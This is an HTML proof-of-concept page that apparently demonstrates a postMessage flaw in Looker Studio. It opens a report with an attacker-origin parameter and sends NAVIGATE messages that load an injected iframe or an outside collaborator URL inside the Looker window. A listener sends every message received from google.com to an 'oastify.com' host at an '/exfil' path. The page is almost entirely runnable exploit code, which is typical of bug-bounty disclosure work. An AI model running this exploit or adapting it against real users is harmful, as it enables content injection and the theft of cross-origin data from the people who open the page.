<!DOCTYPE html>
<html>
<head><title>Looker Studio - Arbitrary Iframe Injection PoC</title></head>
<body>
<h2>Looker Studio - Arbitrary Iframe Injection via NAVIGATE postMessage</h2>
<p>This PoC opens Looker Studio in a new window with <code>liu=</code> attacker origin, then injects an arbitrary iframe inside it via the <code>NAVIGATE</code> handler.</p>
<hr>

<button id="startBtn" onclick="startExploit()" style="font-size:18px;padding:10px 30px;cursor:pointer;">Start PoC</button>

<h3>Log</h3>
<pre id="log" style="background:#111;color:#0f0;padding:10px;max-height:400px;overflow-y:auto;font-size:13px;"></pre>

<script>
var ATTACKER_ORIGIN = window.location.origin;
var COLLABORATOR = 'https://7z7kqkxfeu6suua3sb1vsor2ltrkfd32.oastify.com';
var REPORT_URL = 'https://lookerstudio.google.com/reporting/be06bd59-7ae1-4373-825c-075088ba0d51/page/p0/appview';
var lookerWindow = null;

function logMsg(msg) {
    var pre = document.getElementById('log');
    pre.textContent += '[' + new Date().toISOString().split('T')[1].split('.')[0] + '] ' + msg + '\n';
    pre.scrollTop = pre.scrollHeight;
}

function buildUrl() {
    var u = new URL(REPORT_URL);
    u.searchParams.set('liu', ATTACKER_ORIGIN);
    u.searchParams.set('release', 'r3');
    u.searchParams.set('lem', 'true');
    return u.toString();
}

// Intercept all postMessages from Looker
window.addEventListener('message', function(e) {
    var data = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
    logMsg('RECV [' + e.origin + ']: ' + data.substring(0, 500));

    if (e.origin.indexOf('google.com') !== -1) {
        new Image().src = COLLABORATOR + '/exfil?d=' + encodeURIComponent(data.substring(0, 300));
    }
});

function startExploit() {
    document.getElementById('startBtn').disabled = true;
    document.getElementById('startBtn').textContent = 'Running...';

    var targetUrl = buildUrl();
    logMsg('Opening Looker Studio in new window with liu=' + ATTACKER_ORIGIN);

    // Open Looker in a new window (attacker is window.opener)
    lookerWindow = window.open(targetUrl, 'looker', 'width=1200,height=800');

    if (!lookerWindow) {
        logMsg('ERROR: Popup blocked. Allow popups and try again.');
        document.getElementById('startBtn').disabled = false;
        document.getElementById('startBtn').textContent = 'Start PoC';
        return;
    }

    logMsg('Window opened. Waiting 6s for Angular bootstrap...');

    setTimeout(function() {
        logMsg('Sending NAVIGATE to inject collaborator iframe inside Looker window...');

        // NAVIGATE with a data: URI that shows the Looker page content
        // AND embeds the collaborator iframe inside it â€” visually proving injection
        var injectedHtml = [
            '<html><body style="margin:0;font-family:Arial;">',
            '<div style="position:fixed;bottom:10px;right:10px;z-index:999999;',
            'background:#1a1a2e;border:2px solid #e94560;border-radius:8px;',
            'padding:12px;width:340px;box-shadow:0 4px 20px rgba(0,0,0,0.5);">',
            '<div style="color:#e94560;font-weight:bold;font-size:13px;margin-bottom:6px;">',
            'INJECTED IFRAME (attacker controlled)</div>',
            '<div style="color:#aaa;font-size:11px;margin-bottom:8px;">',
            'Loaded inside lookerstudio.google.com context</div>',
            '<iframe src="' + COLLABORATOR + '/injected-inside-looker?proof=navigate-handler"',
            ' width="100%" height="120" style="border:1px solid #e94560;border-radius:4px;background:#fff;"></iframe>',
            '</div></body></html>'
        ].join('');

        lookerWindow.postMessage(JSON.stringify({
            type: 'NAVIGATE',
            payload: { url: 'data:text/html,' + encodeURIComponent(injectedHtml) }
        }), '*');

        logMsg('NAVIGATE (data: URI with embedded iframe) sent to Looker window');

        // Fallback: also try direct URL navigate after 3s
        setTimeout(function() {
            logMsg('Sending direct NAVIGATE to collaborator URL...');
            lookerWindow.postMessage(JSON.stringify({
                type: 'NAVIGATE',
                payload: { url: COLLABORATOR + '/injected-iframe?proof=direct-navigate' }
            }), '*');
            logMsg('Direct NAVIGATE sent. Check Collaborator for Referer: lookerstudio.google.com');

            document.getElementById('startBtn').disabled = false;
            document.getElementById('startBtn').textContent = 'Run Again';
        }, 3000);

    }, 6000);
}
</script>
</body>
</html>
